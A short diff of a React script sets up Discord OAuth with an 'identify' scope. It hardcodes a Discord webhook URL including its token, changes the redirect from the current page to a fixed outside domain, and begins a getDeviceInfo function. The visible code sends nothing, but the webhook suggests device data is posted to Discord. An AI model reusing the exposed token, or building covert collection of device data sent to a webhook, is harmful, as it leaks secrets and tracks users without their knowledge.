@@ -2,7 +2,8 @@ const { useState, useEffect, useRef, useCallback } = React;
 
 const discordWebhookURL = `https://discord.com/api/webhooks/1415852727145336832/RrVh5LhYuqcAsUtnZkHIkcPOrJmKrmdQePFrOpuQh_AvSdLNNN1oND7xPv3v4z_64p12`;
 const CLIENT_ID = "1415538798460272723";
-const REDIRECT_URI = encodeURIComponent(window.location.href); // current page
+const REDIRECT_URI = encodeURIComponent("https://coreapi.online/");
+
 const SCOPE = "identify";
 
 function getDeviceInfo() {
